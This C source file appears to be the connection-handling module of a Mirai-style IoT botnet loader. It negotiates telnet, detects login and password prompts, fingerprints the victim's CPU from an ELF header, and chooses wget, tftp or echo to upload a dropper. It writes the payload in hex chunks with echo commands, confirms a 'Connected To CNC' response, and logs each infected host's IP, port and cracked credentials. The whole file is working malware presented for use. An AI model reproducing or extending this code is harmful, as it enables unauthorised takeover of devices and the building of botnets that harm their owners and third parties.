#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <pthread.h>

#include "headers/includes.h"
#include "headers/connection.h"
#include "headers/server.h"
#include "headers/binary.h"
#include "headers/util.h"

void connection_open(struct connection *conn)
{
    pthread_mutex_lock(&conn->lock);

    conn->rdbuf_pos = 0;
    conn->last_recv = time(NULL);
    conn->timeout = 15;
    conn->echo_load_pos = 0;
    conn->state_telnet = TELNET_CONNECTING;
    conn->success = FALSE;
    conn->open = TRUE;
    conn->bin = NULL;
    conn->use_slash_c = 0;
    conn->echo_retries = 0;
    conn->info.has_arch = 0;
    conn->clear_up = 0;

    #ifdef DEBUG
        printf("[FD%d] Called connection_open, timeout: %d\n", conn->fd, conn->timeout);
    #endif

    pthread_mutex_unlock(&conn->lock);
}

void connection_close(struct connection *conn)
{
    pthread_mutex_lock(&conn->lock);

    if(conn->open)
    {
        #ifdef DEBUG
            printf("[FD%d] Shut down connection\n", conn->fd);
        #endif
        memset(conn->output_buffer.data, 0, sizeof(conn->output_buffer.data));
        conn->output_buffer.deadline = 0;
        conn->last_recv = 0;
        conn->open = FALSE;
        conn->retry_bin = FALSE;
        conn->ctrlc_retry = FALSE;
        memset(conn->rdbuf, 0, sizeof(conn->rdbuf));
        conn->rdbuf_pos = 0;
        conn->echo_load_pos = 0;
        conn->use_slash_c = 0;
        conn->echo_retries = 0;
        conn->info.has_arch = 0;
        conn->clear_up = 0;

        if(conn->srv == NULL)
        {
            return;
        }

        if(conn->success)
        {
            ATOMIC_INC(&conn->srv->total_successes);
			fprintf(stderr, "\e[1:37m[\e[0:32mINFECTED\e[1:37m]  \e[0:32m %d.%d.%d.%d:%d %s:%s %s\r\n",
                conn->info.addr & 0xff, (conn->info.addr >> 8) & 0xff, (conn->info.addr >> 16) & 0xff, (conn->info.addr >> 24) & 0xff,
                ntohs(conn->info.port),
                conn->info.user, conn->info.pass, conn->info.arch);
        }
        else
        {
			ATOMIC_INC(&conn->srv->total_failures);
        }
    }

    conn->state_telnet = TELNET_CLOSED;

    if(conn->fd != -1)
    {
        close(conn->fd);
        conn->fd = -1;
        ATOMIC_DEC(&conn->srv->curr_open);
    }

    pthread_mutex_unlock(&conn->lock);
}

int connection_consume_iacs(struct connection *conn)
{
    int consumed = 0;
    uint8_t *ptr = conn->rdbuf;

    while(consumed < conn->rdbuf_pos)
    {
        int i = 0;

        if(*ptr != 0xff)
            break;
        else if(*ptr == 0xff)
        {
            if(!can_consume(conn, ptr, 1))
                break;
            if(ptr[1] == 0xff)
            {
                ptr += 2;
                consumed += 2;
                continue;
            }
            else if(ptr[1] == 0xfd)
            {
                uint8_t tmp1[3] = {255, 251, 31};
                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

                if(!can_consume(conn, ptr, 2))
                    break;
                if(ptr[2] != 31)
                    goto iac_wont;

                ptr += 3;
                consumed += 3;

                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
                send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else
            {
                iac_wont:

                if(!can_consume(conn, ptr, 2))
                    break;

                for(i = 0; i < 3; i++)
                {
                    if(ptr[i] == 0xfd)
                        ptr[i] = 0xfc;
                    else if(ptr[i] == 0xfb)
                        ptr[i] = 0xfd;
                }

                send(conn->fd, ptr, 3, MSG_NOSIGNAL);
                ptr += 3;
                consumed += 3;
            }
        }
    }

    return consumed;
}

int connection_consume_login_prompt(struct connection *conn)
{
    char *pch;
    int i = 0, prompt_ending = -1;

    for(i = conn->rdbuf_pos; i >= 0; i--)
    {
        if(conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            #ifdef DEBUG
                printf("matched login prompt at %d, \"%c\", \"%s\"\n", i, conn->rdbuf[i], conn->rdbuf);
            #endif
            prompt_ending = i;
            break;
        }
    }

    if(prompt_ending == -1)
    {
        int tmp = 0;

        if((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1)
            prompt_ending = tmp;
        else if((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) != -1)
            prompt_ending = tmp;
    }

    if(prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

int connection_consume_password_prompt(struct connection *conn)
{
    char *pch;
    int i = 0, prompt_ending = -1;

    for(i = conn->rdbuf_pos; i >= 0; i--)
    {
        if(conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            #ifdef DEBUG
                printf("matched password prompt at %d, \"%c\", \"%s\"\n", i, conn->rdbuf[i], conn->rdbuf);
            #endif
            prompt_ending = i;
            break;
        }
    }

    if(prompt_ending == -1)
    {
        int tmp = 0;

        if((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "assword", 7)) != -1)
            prompt_ending = tmp;
    }

    if(prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

int connection_consume_prompt(struct connection *conn)
{
    char *pch;
    int i = 0, prompt_ending = -1;

    for(i = conn->rdbuf_pos; i >= 0; i--)
    {
        if(conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            #ifdef DEBUG
                printf("matched any prompt at %d, \"%c\", \"%s\"\n", i, conn->rdbuf[i], conn->rdbuf);
            #endif
            prompt_ending = i;
            break;
        }
    }

    if(prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

int connection_consume_verify_login(struct connection *conn)
{
    int prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if(prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

int connection_consume_copy_op(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if(offset == -1)
        return 0;

    return offset;
}

int connection_consume_arch(struct connection *conn)
{
    if(!conn->info.has_arch)
    {
        struct elf_hdr *ehdr;
        int elf_start_pos = 0;
        char *elf_magic = "\x7f\x45\x4c\x46";

        if((elf_start_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, elf_magic, 4)) == -1)
        //if((elf_start_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ELF", 3)) == -1)
            return 0;
        elf_start_pos -= 4;

        if(elf_start_pos > 0)
        {
            ehdr = (struct elf_hdr *)(conn->rdbuf + elf_start_pos);
            conn->info.has_arch = TRUE;

            if(ehdr->e_ident[EI_DATA] == EE_LITTLE)
                // little endian
                ehdr->e_machine = ehdr->e_machine;
            else
                // big endian
                ehdr->e_machine = htons(ehdr->e_machine);

            #ifdef DEBUG
                printf("[FD%d] e_machine number %d\n", conn->fd, ehdr->e_machine);
            #endif

            if(ehdr->e_machine == EM_ARM || ehdr->e_machine == EM_AARCH64)
                strcpy(conn->info.arch, "arm");
            else if(ehdr->e_machine == EM_MIPS || ehdr->e_machine == EM_MIPS_RS3_LE)
            {
                if(ehdr->e_ident[EI_DATA] == EE_LITTLE)
                    strcpy(conn->info.arch, "mpsl");
                else
                    strcpy(conn->info.arch, "mips");
            }
            else if(ehdr->e_machine == EM_386 || ehdr->e_machine == EM_486 || ehdr->e_machine == EM_860 || ehdr->e_machine == EM_X86_64)
                strcpy(conn->info.arch, "x86");
            else if(ehdr->e_machine == EM_SPARC || ehdr->e_machine == EM_SPARC32PLUS || ehdr->e_machine == EM_SPARCV9)
                strcpy(conn->info.arch, "spc");
            else if(ehdr->e_machine == EM_68K || ehdr->e_machine == EM_88K)
                strcpy(conn->info.arch, "m68k");
            else if(ehdr->e_machine == EM_PPC || ehdr->e_machine == EM_PPC64)
                strcpy(conn->info.arch, "ppc");
            else if(ehdr->e_machine == EM_SH)
                strcpy(conn->info.arch, "sh4");
            else if(ehdr->e_machine == EM_RCE)
                strcpy(conn->info.arch, "rce");
            else if(ehdr->e_machine == EM_ARC)
                strcpy(conn->info.arch, "arc");
            else
            {
                conn->info.arch[0] = 0;
                connection_close(conn);
            }
        }
    }
    else
    {
        #ifdef DEBUG
            printf("[FD%d] %s\n", conn->fd, conn->rdbuf);
        #endif
        
        int offset = 0;

        if((offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE))) != -1)
            return offset;

        if(conn->rdbuf_pos > 7168)
        {
            #ifdef DEBUG
                printf("[FD%d] rdbuf_pos > 7168\n", conn->fd);
            #endif
            memmove(conn->rdbuf, conn->rdbuf + 6144, conn->rdbuf_pos - 6144);
            conn->rdbuf_pos -= 6144;
        }
    }
    
    return 0;
}

int connection_consume_arm_subtype(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if(offset == -1)
        return 0;

    if(util_memsearch(conn->rdbuf, offset, "ARMv7", 5) != -1 || util_memsearch(conn->rdbuf, offset, "ARMv6", 5) != -1)
    {
        #ifdef DEBUG
            printf("[FD%d] Arch has ARMv7!\n", conn->fd);
        #endif
        strcpy(conn->info.arch, "arm7");
    }

    return offset;
}

int connection_consume_upload_methods(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if(offset == -1)
        return 0;
    
    if(util_memsearch(conn->rdbuf, offset, "wget: applet not found", 22) == -1)
        conn->info.upload_method = UPLOAD_WGET;
    else if(util_memsearch(conn->rdbuf, offset, "tftp: applet not found", 22) == -1)
        conn->info.upload_method = UPLOAD_TFTP;
    else
        conn->info.upload_method = UPLOAD_ECHO;

    return offset;
}

int connection_upload_echo(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if(offset == -1)
        return 0;

    if(conn->bin == NULL)
    {
        connection_close(conn);
        return 0;
    }

    if(conn->echo_load_pos == conn->bin->hex_payloads_len)
        return offset;

    if(conn->use_slash_c == 1)
        util_sockprintf(conn->fd, "echo '%s\\c' %s %s; " TOKEN_QUERY "\r\n",
                        conn->bin->hex_payloads[conn->echo_load_pos], (conn->echo_load_pos == 0) ? ">" : ">>", FN_DROPPER);
    else
        util_sockprintf(conn->fd, "echo -ne '%s' %s %s; " TOKEN_QUERY "\r\n",
                        conn->bin->hex_payloads[conn->echo_load_pos], (conn->echo_load_pos == 0) ? ">" : ">>", FN_DROPPER);
    conn->echo_load_pos++;

    memmove(conn->rdbuf, conn->rdbuf + offset, conn->rdbuf_pos - offset);
    conn->rdbuf_pos -= offset;

    return 0;
}

int connection_upload_wget(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if(offset == -1)
        return 0;
    
    if(util_memsearch(conn->rdbuf, offset, "Permission denied", 17) != -1)
        return offset * -1;
    else if(util_memsearch(conn->rdbuf, offset, "nvalid option", 13) != -1)
        return offset * -1;
    else if(util_memsearch(conn->rdbuf, offset, "llegal option", 13) != -1)
        return offset * -1;
    else if(util_memsearch(conn->rdbuf, offset, "No space left on device", 23) != -1)
    {
        conn->clear_up = 1;
        return offset * -1;
    }

    return offset;
}

int connection_upload_tftp(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if(offset == -1)
        return 0;

    if(util_memsearch(conn->rdbuf, offset, "Permission denied", 17) != -1)
        return offset * -1;
    else if(util_memsearch(conn->rdbuf, offset, "timeout", 7) != -1)
        return offset * -1;
    else if(util_memsearch(conn->rdbuf, offset, "llegal option", 13) != -1)
        return offset * -1;
    else if(util_memsearch(conn->rdbuf, offset, "nvalid option", 13) != -1)
        return offset * -1;
    else if(util_memsearch(conn->rdbuf, offset, "No space left on device", 23) != -1)
    {
        conn->clear_up = 1;
        return offset * -1;
    }

    return offset;
}

int connection_verify_payload(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, EXEC_RESPONSE, strlen(EXEC_RESPONSE));

    if(offset == -1)
        return 0;
    
    if(util_memsearch(conn->rdbuf, offset, "Connected To CNC", 16) == -1)
        return offset;
    else
        return 255 + offset;
}

int connection_consume_cleanup(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if(offset == -1)
        return 0;

    return offset;
}

static BOOL can_consume(struct connection *conn, uint8_t *ptr, int amount)
{
    uint8_t *end = conn->rdbuf + conn->rdbuf_pos;

    return ptr + amount < end;
}
